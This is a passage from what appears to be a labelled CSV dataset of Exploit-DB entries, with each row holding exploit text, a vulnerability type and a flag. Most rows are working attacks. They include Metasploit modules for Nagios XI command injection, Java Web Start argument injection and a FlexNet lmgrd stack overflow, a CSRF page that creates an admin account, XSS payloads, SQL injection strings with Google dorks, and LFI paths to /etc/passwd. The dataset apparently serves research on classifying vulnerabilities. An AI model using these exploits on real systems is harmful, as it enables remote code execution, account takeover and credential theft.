value='(.+)'>/).flatten[0] || '' 		cookie = (res.headers['Set-Cookie'] || '').scan(/nagiosxi=(\w+); /).flatten[0]  || '' 		return nsp, cookie 	end  	def is_loggedin(cookie) 		res = send_request_cgi({ 			'method' => 'GET', 			'uri'    => '/nagiosxi/index.php', 			'cookie' => ""nagiosxi=#{cookie}"" 		})  		if res and res.body =~ /Logged in as: <a href="".+"">#{datastore['USERNAME']}<\/a>/ 			return true 		else 			return false 		end 	end  	def login(nsp, cookie) 		res = send_request_cgi({ 			'method'    => 'POST', 			'uri'       => '/nagiosxi/login.php', 			'cookie'    => ""nagiosxi=#{cookie}"", 			'vars_post' => { 				'nsp'         => nsp, 				'page'        => 'auth', 				'debug'       => '', 				'pageopt'     => 'login', 				'username'    => datastore['USERNAME'], 				'password'    => datastore['PASSWORD'], 				'loginButton' => 'Login' 			}, 			'headers'   => { 				'Origin'  => ""http://#{rhost}"", 				'Referer' => ""http://#{rhost}/nagiosxi/login.php"" 			} 		})  		return is_loggedin(cookie) 	end  	def exploit 		nsp, cookie = get_login_data 		if nsp.empty? 			print_error(""Unable to retrieve hidden value 'nsp'"") 			return false 		end  		if login(nsp, cookie) 			print_status(""Logged in as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'"") 		else 			print_error(""Failed to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'"") 			return 		end  		print_status(""Sending Command injection"") 		send_request_cgi({ 			'method'   => 'GET', 			'uri'      => '/nagiosxi/includes/components/graphexplorer/visApi.php', 			'cookie'   => ""nagiosxi=#{cookie}"", 			'vars_get' => { 				'type' => 'stack', 				'host' => ""localhost`#{payload.encoded}`"", 				'service' => 'Swap_Usage', 				'div'     => 'visContainer1566841654', 				'opt'     => 'days' 			} 		}) 	end   end","Command Injection""",1
48581,"Avaya IP Office 11 - Password Disclosure # Exploit Title: Avaya IP Office 11 - Password Disclosure # Exploit Author: hyp3rlinx # Date: 2020-06-09 # Vender Homepage: https://downloads.avaya.com # Product Link: https://downloads.avaya.com/css/P8/documents/101067493 # CVE: CVE-2020-7030  [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/AVAYA-IP-OFFICE-INSECURE-TRANSIT-PASSWORD-DISCLOSURE.txt [+] twitter.com/hyp3rlinx [+] ISR: ApparitionSec   [Vendor] www.avaya.com   [Product] Avaya IP Office v9.1.8.0 - 11  IP Office Platform provides a single, stackable, scalable small business communications system that grows with your business easily and cost-effectively.   [Vulnerability Type] Insecure Transit Password Disclosure   [CVE Reference] CVE-2020-7030 ASA-2020-077   [Security Issue] A sensitive information disclosure vulnerability exists in the web interface component of IP Office that may potentially allow a local user to gain unauthorized access to the component.  The request URL on port 7071 and the web socket component requests on port 7070 used by Atmosphere-Framework within Avaya IP Office, pass Base64 encoded credentials as part of the URL query string.  https://<TARGET-IP>:7071/serveredition/autologin?auth=QWRtaW5pc3RyYXRvcjpBZG1pbmlzdHJhdG9y&referrer=https://x.x.x.x:7070&lang=en_US  wss://<TARGET-IP>:7070/WebManagement/webmanagement/atmosphere/QWRtaW5pc3RyYXRvcjpBZG1pbmlzdHJhdG9y?X-Atmosphere-tracking-id=0& X-Atmosphere-Framework=2.0.5-javascript&X-Atmosphere-Transport=websocket&X-Cache-Date=0&Content-Type=text/x-gwt-rpc;%20charset=UTF-8&X-atmo-protocol=true    Base64 credentials: QWRtaW5pc3RyYXRvcjpBZG1pbmlzdHJhdG9y Value: Administrator:Administrator   The Base64 encoded credentials can be easily disclosed if the machine used to logon to the web Manager is accessed by an attacker. The URL plus the credentials can potentially be leaked or stored in some of the following locations.  Browser History Browser Cache Browser Developer Tools Cached by web proxy Referer Header Web Logs Shared Systems   [Avaya Products affected] Avaya IP Office 9.x, 10.0 through 10.1.0.7, 11.0 through 11.0.4.2   [References] https://downloads.avaya.com/css/P8/documents/101067493   [Network Access] Remote   [Severity] Medium   [Disclosure Timeline] Vendor Notification: February 19, 2020 Vendor confirms issue: March 4, 2020 Vendor release advisory fix : June 3, 2020 June 4, 2020 : Public Disclosure    [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).  hyp3rlinx",sensitive information disclosure,1
21330,"Netsweeper WebAdmin Portal - Multiple Vulnerabilities # Exploit Title: Netsweeper WebAdmin Portal CSRF, Reflective XSS, and SQL Injection (""The later"")\ # Date: Discovered and reported CSRF and XSS 4/2012 and ""The later"" 7/2012\ # Author: Jacob Holcomb/Gimppy042\ # Software Link: Netsweeper Inc. - Netsweeper Internet Filter (www.netsweeper.com)\ # CVE : CVE-2012-2446 for the XSS issues, CVE-2012-2447 for the CSRF, and  CVE-2012-3859 for the SQL Injection (""The later) NOTE:  # ""The later"" was disclosed and reported to Netsweeper at a later date and will be posted as an addendum to this post and my posted disclosure report in the near future. ""The later"" vulnerability bears CVE-2012-3859.  CSRF Exploitation:  In the following example we use CSRF to forge a HTTP POST request that will create an administrator account. The user must be logged in for CSRF to work. Exploitation of a non-administrative users (Sys op) account results in creation of a standard user account.  <head> <title>CSRF Create Admin - Netsweeper WebAdmin Portal BY:Jacob Holcomb</title> </head>  <body>  <form name=""pwnd"" action=""http://server.domain_name/webadmin/accountmgr/adminupdate.php?act=add&filter_login=&goodmsg=Account+Added"" method=""post""> <input type=""hidden"" name=""userid"" value=""netsweeperPWND"" /> <input type=""hidden"" name=""firstname"" value=""Jacob"" /> <input type=""hidden"" name=""lastname"" value=""Holcomb"" /> <input type=""hidden"" name=""email"" value=""pwnd@pwnd.com"" /> <input type=""hidden"" name=""organization"" value=""yep_PWND"" /> <input type=""hidden"" name=""description"" value=""PWND"" /> <input type=""hidden"" name=""pass1"" value=""Pwnd-321"" /> <input type=""hidden"" name=""pass2"" value=""Pwnd-321"" /> <input type=""hidden"" name=""classification"" value=""admin"" /> <input type=""hidden"" name=""expire"" value="""" /> <input type=""hidden"" name=""accounttheme"" value="""" /> <input type=""hidden"" name=""accountpmtheme"" value=""gpmtheme"" />  <script> document.pwnd.submit(); </script>  </body>   XSS Exploitation:  The following POC code exploits a reflective XSS vulnerability using the HTTP POST method.  <head> <title>Post XSS(Reflective) Netsweeper WebAdmin Portal BY:Jacob Holcomb</title> </head>  <body>  <form name=""pwnd"" action=""http:// server.domain_name /webadmin/tools/local_lookup.php?action=lookup"" method=""post""> <input type=""hidden"" name=""user"" value=""pwnd"" /> <input type=""hidden"" name=""group"" value=""><script>alert('XSS')</script>"" /> <input type=""hidden"" name=""policy"" value=""pwnd"" /> <input type=""hidden"" name=""url"" value=""pwnd"" />  <script> document.getElementById('pwnd').submit(); </script>  </body>   SQL Injection (""The later"") Exploitation:  The Netsweeper Internet Filter WebAdmin Portal is vulnerable to SQL injection, in the sortorder and sortitem variables.  http://SERVER_Hostname/webadmin/reporter/view_details.php?sortitem= SQLi none &sortorder=asc&type=demand&id=1441 or  http://SERVER_Hostname/webadmin/reporter/view_details.php?sortitem=report_date&sortorder= SQLi none &type=demand&id=1441.",XSS,1
29506,"Bitweaver 1.3.1 Articles and Blogs - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/22169/info  Bitweaver is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  These issues affect version 1.3.1; other versions may also be vulnerable.   http://www.example.com/articles/edit.php/>""><ScRiPt>alert(907810260)%3B</ScRiPt> http://www.example.com/articles/list.php/>""><ScRiPt>alert(907810260)%3B</ScRiPt> http://www.example.com/blogs/list_blogs.php/>""><ScRiPt>alert(907810260)%3B</ScRiPt> http://www.example.com/blogs/rankings.php/>""><ScRiPt>alert(907810260)%3B</ScRiPt>",Cross-Site Scripting,1
19803,"Sam Hawker wmcdplay 1.0 beta1-2 - Local Buffer Overflow (2) source: https://www.securityfocus.com/bid/1047/info   wmcdplay is cdplayer generally used with the WindowMaker X11 window-manager on unix systems. While wmcdplay is rarely installed at all by default, when it is installed it is typically set setuid root. wmcdplay is vulnerable to a buffer overflow attack due to lack of bounds checking on an argument it is passed. As a result, a local user can elevate their priviliges to root through overruning the stack and executing arbitrary code with the effective user-id of the process (root).  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/19803.tar.gz",Local Buffer Overflow,1
12068,"Joomla! Component LoginBox - Local File Inclusion  ================================================================================================   Title    : Joomla Component com_loginbox LFI Vulnerability  Date     : Monday, 05 April 2010 (Indonesia)  Author   : Vrs-hCk  Contact  : ander[at]antisecurity.org  Blog     : http://c0li.blogspot.com/   ================================================================================================   [+] Exploit       http://[site]/[path]/index.php?option=com_loginbox&view=[LFI]   [+] PoC       http://localhost/index.php?option=com_loginbox&view=../../../../../../../../../etc/passwd%00   ================================================================================================   Greetz   :       www.MainHack.net - www.ServerIsDown.org - www.AntiSecurity.org      Paman, NoGe, OoN_Boy, pizzyroot, zxvf, matthews, Genex, s4va, stardustmemory,      wishnusakti, bl4Ck_3n91n3, H312Y, S3T4N, xr00tb0y, str0ke, dkk.   ================================================================================================  # c0li.m0de.0n",Local File Inclusion,1
38938,"xBoard 5.0/5.5/6.0 - 'view.php' Local File Inclusion source: https://www.securityfocus.com/bid/64619/info  xBoard is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to obtain potentially sensitive information and execute arbitrary local scripts. This could allow the attacker to compromise the application and the computer; other attacks are also possible.  xBoard 5.0, 5.5, and 6.0 are vulnerable.   http://www.example.com/xboard/view.php?post=[LFI]",Local File Inclusion,1
5214,"Mitra Informatika Solusindo cart - SQL Injection #############################SolpotCrew Community################################ # #  Mitra Informatika Solusindo cart Remote Sql Injection Exploit # #  vendor : http://www.mitrainformatika.com/ # ################################################################################# # # #       Bug Found By : home_edition2001 a.k.a (bius) (4-03-2008) # #       contact: bius-was-here@dinastore.com # #       Website : www.solpotcrew.org/adv/home_edition2001-adv-03.txt # ################################################################################ # # #      Greetz: NYUBI,h4ntu,Ibnusina , Sikodoq , ghareng , Saritem ,Ingin_belajar #              pannel , Matdhule , Naruto , d\i\c\k\y , ASP , Roney , live #              kabut , Portrait , huhuhu , geronimo , Bolis ,HearTBreaK #              Blue|spy , X8 , dead , ZDe , K1tk4t , webmaster #              x-ace , ardan , th3sn0wbr4in , BrainDrain #              and all member solpotcrew community #              http://www.solpotcrew.org/forum/ #              #nyubicrew @ irc.mildnet.cn #              especially thx to str0ke @ milw0rm.com # ############################################################################### # Exploit in:                                                              # # /index.php?c=10&p=-7(SQL)                                    		   # #                                                                          # # Example:                                                                 # #                                                                          # # (SQL)%20union%20select%200,concat(user_name,user_password),null,null,null,null,null,null%20from%20tbl_agen-- ############################################################################  google dork : Powered by  Mitra Informatika Solusindo               Mitra Informatika Solusindo cart                intitle:'Mitra Informatika Solusindo' Shopingcart System    ##############################MY LOVE JUST FOR U Dina Mariance######################### ######################################E.O.F##################################  # milw0rm.com [2008-03-04]",SQL Injection,1
18520,"Sun Java Web Start Plugin - Command Line Argument Injection (2012) (Metasploit) ## # $Id$ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	# 	# This module acts as an HTTP server 	# 	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::EXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Sun Java Web Start Plugin Command Line Argument Injection (2012)', 			'Description'    => %q{ 					This module exploits a flaw in the Web Start component of the Sun Java 				Runtime Environment. The arguments passed to Java Web Start are not properly 				validated, allowing injection of arbitrary arguments to the JVM.  				By utilizing the lesser known -J option, an attacker can take advantage of 				the -XXaltjvm option, as discussed previously by Ruben Santamarta. This method 				allows an attacker to execute arbitrary code in the context of an unsuspecting 				browser user.  				In order for this module to work, it must be ran as root on a server that 				does not serve SMB. Additionally, the target host must have the WebClient 				service (WebDAV Mini-Redirector) enabled. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 'jduck', # Bug reported to Oracle by TELUS 			'Version'        => '$Revision$', 			'References'     => 				[ 					[ 'CVE', '2012-0500' ], 					[ 'OSVDB', '79227' ], 					[ 'BID', '52015' ], 					[ 'URL', 'http://seclists.org/fulldisclosure/2012/Feb/251' ], 					[ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html' ] 				], 			'Platform'       => 'win', 			'Payload'        => 				{ 					'Space'    => 1024, 					'BadChars' => '', 					'DisableNops' => true, 					'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"" 				}, 			'Targets'        => 				[ 					[ 'Automatic', { } ], 					[ 'Java Runtime on Windows x86', 						{ 							'Platform' => 'win', 							'Arch' => ARCH_X86 						} 					], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Feb 14 2012' 			))  		register_options( 			[ 				OptPort.new('SRVPORT', [ true, ""The daemon port to listen on"", 80 ]), 				OptString.new('URIPATH', [ true, ""The URI to use."", ""/"" ]), 				OptString.new('UNCPATH', [ false, 'Override the UNC path to use. (Use with an SMB server)' ]) 			], self.class) 	end   	def auto_target(cli, request) 		agent = request.headers['User-Agent']  		ret = nil 		#print_status(""Agent: #{agent}"") 		# Check for MSIE and/or WebDAV redirector requests 		if agent =~ /(Windows NT (5|6)\.(0|1|2)|MiniRedir\/(5|6)\.(0|1|2))/ 			ret = targets[1] 		elsif agent =~ /MSIE (6|7|8)\.0/ 			ret = targets[1] 		else 			print_status(""Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}"") 		end  		ret 	end   	def on_request_uri(cli, request)  		# For this exploit, this does little besides ensures the user agent is a recognized one.. 		mytarget = target 		if target.name == 'Automatic' 			mytarget = auto_target(cli, request) 			if (not mytarget) 				send_not_found(cli) 				return 			end 		end  		# Special case to process OPTIONS for / 		if (request.method == 'OPTIONS' and request.uri == '/') 			process_options(cli, request, mytarget) 			return 		end  		# Discard requests for ico files 		if (request.uri =~ /\.ico$/i) 			send_not_found(cli) 			return 		end  		# If there is no subdirectory in the request, we need to redirect. 		if (request.uri == '/') or not (request.uri =~ /\/([^\/]+)\//) 			if (request.uri == '/') 				subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/' 			else 				subdir = request.uri + '/' 			end 			print_status(""Request for \""#{request.uri}\"" does not contain a sub-directory, redirecting to #{subdir} ..."") 			send_redirect(cli, subdir) 			return 		else 			share_name = $1 		end  		# dispatch WebDAV requests based on method first 		case request.method 		when 'OPTIONS' 			process_options(cli, request, mytarget)  		when 'PROPFIND' 			process_propfind(cli, request, mytarget)  		when 'GET' 			process_get(cli, request, mytarget, share_name)  		when 'PUT' 			print_status(""Sending 404 for PUT #{request.uri} ..."") 			send_not_found(cli)  		else 			print_error(""Unexpected request method encountered: #{request.method}"")  		end  	end  	# 	# GET requests 	# 	def process_get(cli, request, target, share_name)  		print_status(""Responding to \""GET #{request.uri}\"" request from #{cli.peerhost}:#{cli.peerport}"") 		# dispatch based on extension 		if (request.uri =~ /\.dll$/i) 			# 			# DLL requests sent by IE and the WebDav Mini-Redirector 			# 			print_status(""Sending DLL to #{cli.peerhost}:#{cli.peerport}..."")  			# Re-generate the payload 			return if ((p = regenerate_payload(cli)) == nil)  			# Generate a DLL based on the payload 			dll_data = generate_payload_dll({ :code => p.encoded })  			# Send it :) 			send_response(cli, dll_data, { 'Content-Type' => 'application/octet-stream' })  		elsif (request.uri =~ /\.jnlp$/i) 			# 			# Send the jnlp document 			#  			# Prepare the UNC path... 			if (datastore['UNCPATH']) 				unc = datastore['UNCPATH'].dup 			else 				my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'] 				unc = ""\\\\"" + my_host + ""\\"" + share_name 			end  			# NOTE: we ensure there's only a single backslash here since it will get escaped 			if unc[0,2] == ""\\\\"" 				unc.slice!(0, 1) 			end  			http_agent = Rex::Text.rand_text_alpha(8+rand(8))  			jnlp_data = <<-EOS <?xml version=""1.0"" encoding=""UTF-8""?> <jnlp version=""1""> <information>    <title>#{Rex::Text.rand_text_alpha(rand(10)+10)}</title>    <vendor>#{Rex::Text.rand_text_alpha(rand(10)+10)}</vendor>    <description>#{Rex::Text.rand_text_alpha(rand(10)+10)}</description> </information> <resources>    <java version=""1.3+"" initial-heap-size='512m"" -J-XXaltjvm=#{unc} ""' /> </resources> <resources><java java-vm-args='-Dhttp.agent=#{http_agent}""' /></resources> </jnlp> EOS 			print_status(""Sending JNLP to #{cli.peerhost}:#{cli.peerport}..."") 			send_response(cli, jnlp_data, { 'Content-Type' => 'application/x-java-jnlp-file' })  		else 			print_status(""Sending redirect to the JNLP file to #{cli.peerhost}:#{cli.peerport}"") 			jnlp_name = Rex::Text.rand_text_alpha(8 + rand(8))  			jnlp_path = get_resource() 			if jnlp_path[-1,1] != '/' 				jnlp_path << '/' 			end 			jnlp_path << request.uri.split('/')[-1] << '/' 			jnlp_path << jnlp_name << "".jnlp""  			send_redirect(cli, jnlp_path, '')  		end  	end  	# 	# OPTIONS requests sent by the WebDav Mini-Redirector 	# 	def process_options(cli, request, target) 		print_status(""Responding to WebDAV \""OPTIONS #{request.uri}\"" request from #{cli.peerhost}:#{cli.peerport}"") 		headers = { 			#'DASL'   => '<DAV:sql>', 			#'DAV'    => '1, 2', 			'Allow'  => 'OPTIONS, GET, PROPFIND', 			'Public' => 'OPTIONS, GET, PROPFIND' 		} 		send_response(cli, '', headers) 	end   	# 	# PROPFIND requests sent by the WebDav Mini-Redirector 	# 	def process_propfind(cli, request, target) 		path = request.uri 		print_status(""Received WebDAV \""PROPFIND #{request.uri}\"" request from #{cli.peerhost}:#{cli.peerport}"") 		body = ''  		if (path =~ /\.dll$/i) 			# Response for the DLL 			print_status(""Sending DLL multistatus for #{path} ..."") #<lp1:getcontentlength>45056</lp1:getcontentlength> 			body = %Q|<?xml version=""1.0"" encoding=""utf-8""?> <D:multistatus xmlns:D=""DAV:""> <D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> <D:href>#{path}</D:href> <D:propstat> <D:prop> <lp1:resourcetype/> <lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate> <lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified> <lp1:getetag>""39e0132-b000-43c6e5f8d2f80""</lp1:getetag> <lp2:executable>F</lp2:executable> <D:lockdiscovery/> <D:getcontenttype>application/octet-stream</D:getcontenttype> </D:prop> <D:status>HTTP/1.1 200 OK</D:status> </D:propstat> </D:response> </D:multistatus> |  		elsif (path =~ /\/$/) or (not path.sub('/', '').index('/')) 			# Response for anything else (generally just /) 			print_status(""Sending directory multistatus for #{path} ..."") 			body = %Q|<?xml version=""1.0"" encoding=""utf-8""?> <D:multistatus xmlns:D=""DAV:""> <D:response xmlns:lp1=""DAV:"" xmlns:lp2=""http://apache.org/dav/props/""> <D:href>#{path}</D:href> <D:propstat> <D:prop> <lp1:resourcetype><D:collection/></lp1:resourcetype> <lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate> <lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified> <lp1:getetag>""39e0001-1000-4808c3ec95000""</lp1:getetag> <D:lockdiscovery/> <D:getcontenttype>httpd/unix-directory</D:getcontenttype> </D:prop> <D:status>HTTP/1.1 200 OK</D:status> </D:propstat> </D:response> </D:multistatus> |  		else 			print_status(""Sending 404 for #{path} ..."") 			send_not_found(cli) 			return  		end  		# send the response 		resp = create_response(207, ""Multi-Status"") 		resp.body = body 		resp['Content-Type'] = 'text/xml' 		cli.send_response(resp) 	end   	# 	# Make sure we're on the right port/path to support WebDAV 	# 	def exploit 		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/' 			raise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/' 		end  		super 	end  end",Command Line Argument Injection,1
14229,"Bs Auto_Classifieds Script - 'articlesdetails.php' SQL Injection 1               ##########################################             1 0               I'm Sid3^effects member from Inj3ct0r Team             1 1               ##########################################             0 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1  Name : Bs Auto_Classifieds Script(articlesdetails.php) Sqli Vulnerability Date : july 5,2010 Critical Level 	: HIGH vendor URL :http://www.brotherscripts.com/ Price:$24.95 Author : Sid3^effects aKa HaRi <shell_c99[at]yahoo.com> special thanks to : r0073r (inj3ct0r.com),L0rd CruSad3r,MaYur,MA1201,KeDar,Sonic,gunslinger_ greetz to :www.topsecure.net ,All ICW members and my friends :) luv y0 guyz  ####################################################################################################### Description :  Setup your own auto classifieds website with BrotherScripts.com. We are offering a top quality auto listings software which allows car buyers to search available autos for free. The auto listings are highly detailed with photos, dealer/person information and driving directions linked to MapQuest. Dealers and car sellers can list their properties, too. After a new dealer has registered, he/she is able to select and buy a package depending on how many adverts they want to to post and for the time duration they want to show them. Payments are done via PayPal or 2Checkout. Before expiration of the account the dealer will be informed by sending a few emails - 10 days before the expiration of his account, 5 and 1 days. All dealers' listings are deleted automatically after 24 hours of expiration of his account  ####################################################################################################### Xploit :SQli Vulnerability  DEMO URL :http://server/Auto_Classifieds/articlesdetails.php?id=[sqli]  ############################################################################################################### # 0day no more  # Sid3^effects",SQL Injection,1
20012,"Computer Associates eTrust Intrusion Detection 1.4.1.13 - Weak Encryption source: https://www.securityfocus.com/bid/1341/info  A weak encryption scheme exists in Computer Associates eTrust Intrusion Detection System (formerly known as SessionWall-3) password which authorizes users to view and configure the application's registry settings.  Provided that either a remote or local user has access to the registry, it is possible to decrypt the password into plaintext with the use of an exploit tool (sw3passw.exe) or through simple XORing techniques.  This password along with the key is stored in the following registry location: HKEY_LOCAL_MACHINE\Software\ComputerAssociates\SessionWall\1.0\Security\AdminPassword  The first byte will be the length of the key (n), the next (n) bytes are the key, the remaining bytes are the encrypted password with the exception of the last byte which is a terminating null.   20012-1.exe - Administrator password decryptor for Win 9x/NT. 20012-2.zip - Source code (use TASM).   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20012-1.exe  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20012-2.zip",weak encryption scheme,0
18915,"FlexNet License Server Manager - lmgrd Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'FlexNet License Server Manager lmgrd Buffer Overflow', 			'Description'    => %q{ 					This module exploits a vulnerability in the FlexNet 				License Server Manager.  				The vulnerability is due to the insecure usage of memcpy 				in the lmgrd service when handling network packets, which 				results in a stack buffer overflow.  				In order to improve reliability, this module will make lots of 				connections to lmgrd during each attempt to maximize its success. 			}, 			'Author'         => 				[ 					'Luigi Auriemma', # Vulnerability Discovery and PoC 					'Alexander Gavrun', # Vulnerability Discovery 					'juan vazquez', # Metasploit module 					'sinn3r' # Metasploit module 				], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					[ 'OSVDB', '81899' ], 					[ 'BID', '52718' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-052/' ], 					[ 'URL', 'http://aluigi.altervista.org/adv/lmgrd_1-adv.txt' ] 				], 			'Privileged'     => true, 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process' 				}, 			'Payload' => 				{ 					'Space' => 4000 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Debug', {} ], 					[ 'Autodesk Licensing Server Tools 11.5 / lmgrd 11.5.0.0 / Windows XP SP3', 						{ 							'Offset' => 10476, 							'ShellcodeOffset' => 5504, 							'Ret' => 0x0047d01f # ppr from lmgrd.exe 						} 					], 					[ 'Alias License Tools 10.8.0.7 / lmgrd 10.8.0.7 / Windows XP SP3', 						{ 							'Offset' => 7324, 							'ShellcodeOffset' => 2332, 							'Ret' => 0x004eda91 # ppr from lmgrd.exe 						} 					], 					[ 'Alias License Tools 10.8 / lmgrd 10.8.0.2 / Windows XP SP3', 						{ 							'Offset' => 7320, 							'ShellcodeOffset' => 2328, 							'Ret' => 0x004eb2e1 # ppr from lmgrd.exe 						} 					], 				], 			'DefaultTarget'  => 1, 			'DisclosureDate' => 'Mar 23 2012'))  		register_options( 			[ 				Opt::RPORT(27000), 				OptInt.new('Attempts', [ true, 'Number of attempts for the exploit phase', 20 ]), 				OptInt.new('Wait', [ true, 'Delay between brute force attempts', 2 ]), 				OptInt.new('Jam', [ true, 'Number of requests to jam the server', 100 ]) 			], self.class) 	end  	def header_checksum(packet) 		packet_bytes = packet.unpack(""C*"") 		checksum = packet_bytes[0] 		i = 2 		while i < 0x14 			checksum = checksum + packet_bytes[i] 			i = i + 1 		end 		return (checksum & 0x0FF) 	end  	def data_checksum(packet_data) 		word_table = """" 		i = 0 		while i < 256 			v4 = 0 			v3 = i 			j = 8  			while j > 0 				if ((v4 ^ v3) & 1) == 1 					v4 = ((v4 >> 1) ^ 0x3A5D) & 0x0FFFF 				else 					v4 = (v4 >> 1) & 0x0FFFF 				end 				v3 >>= 1 				j = j - 1 			end  			word_table << [v4].pack(""S"") 			i = i + 1 		end 		k = 0 		checksum = 0 		data_bytes = packet_data.unpack(""C*"") 		word_table_words = word_table.unpack(""S*"") 		while k < packet_data.length 			position = data_bytes[k] ^ (checksum & 0x0FF) 			checksum = (word_table_words[position] ^ (checksum >> 8)) & 0x0FFFF 			k = k + 1 		end 		return checksum 	end  	def create_packet(data) 		pkt = ""\x2f"" 		pkt << ""\x00"" # header checksum 		pkt << ""\x00\x00"" # data checksum 		pkt << ""\x00\x00"" # pkt length 		pkt << ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" 		pkt << data  		pkt[4,2] = [pkt.length].pack(""n"")  		data_sum = data_checksum(pkt[4, pkt.length - 4]) 		pkt[2, 2] = [data_sum].pack(""n"")  		hdr_sum = header_checksum(pkt[0, 20]) 		pkt[1] = [hdr_sum].pack(""C"")  		return pkt 	end  	def jam 		pkt = create_packet("""")  		datastore['Jam'].times do 			connect 			sock.put(pkt) 			disconnect 		end 	end  	def exploit 		i = 1 		while i <= datastore['Attempts'] and not session_created? 			print_status(""Attempt #{i}/#{datastore['Attempts']} to exploit..."") 			do_exploit 			sleep(datastore['Wait']) 			i = i + 1 		end  		if not session_created? 			print_error(""Exploit didn't work after #{i} attempts"") 		end 	end  	def do_exploit 		t = framework.threads.spawn(""jam"", false) { jam } 		my_payload = payload.encoded  		header_length = 20 # See create_packet() to understand this number 		pkt_data = """" 		if target.name =~ /Debug/ 			pkt_data << ""a"" * (65535 - header_length) 		else 			pkt_data << ""a"" * target['ShellcodeOffset'] 			pkt_data << my_payload 			pkt_data << rand_text(target['Offset']-target['ShellcodeOffset']-my_payload.length) 			pkt_data << generate_seh_record(target.ret) 			pkt_data << Metasm::Shellcode.assemble(Metasm::Ia32.new, ""jmp $-5000"").encode_string 			pkt_data << rand_text(65535 - pkt_data.length - header_length) 		end  		pkt = create_packet(pkt_data)  		connect 		sock.put(pkt) 		handler 		disconnect 	end  end",stack buffer overflow,1
44469,"Sophos Cyberoam UTM CR25iNG - 10.6.3 MR-5 - Direct Object Reference # Exploit Title: Sophos Cyberoam UTM - Privilege Escalation # Date: 31/08/2016 # Exploit Author: Chintan Gurjar (Frogy) # Vendor Homepage: http://www.sophos.com/ # Software Link: https://www.cyberoam.com/downloads/datasheet/CR25iNG.html # Version: Cyberoam CR25iNG - 10.6.3 MR-5 # CVE : CVE-2016-7786 # Category : Webapps # CVSS Score: 9.3  Description =========== A vulnerability, which was classified as critical, has been found in Sophos Cyberoam UTM CR25iNG 10.6.3 MR-5. This issue affects an unknown function of the file Licenseinformation.jsp of the component Access Restriction. The manipulation with an unknown input leads to a privilege escalation vulnerability. Using CWE to declare the problem leads to CWE-264. Impacted are confidentiality, integrity, and availability. The weakness was released 04/07/2017. The advisory is shared for download at infosecninja.blogspot.in. The identification of this vulnerability is CVE-2016-7786 since 09/09/2016. The attack may be initiated remotely. The successful exploitation needs a single authentication. Technical details of the vulnerability are known. Upgrading to version 10.6.5 eliminates this vulnerability.  Steps to reproduce =================== 1. Login with admin user account. 2. Navigate to the dashboard and observe all GET URLs through burp proxy. Save URLs. 3. Logout and login with a low privileged user account who does not have even read/write/execution permission. 4. Access saved admin functionality URLs with a low privileged user account. 5. Access the admin information from the user account.  Video Demonstration ==================== https://www.youtube.com/watch?v=unV3-DdIxXw&t=2s   PoC =============== Request:  GET /corporate/webpages/dashboard/LicenseInformation.jsp HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/plain, */*; q=0.01 Accept-Language: en-US,en;1=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Referer: 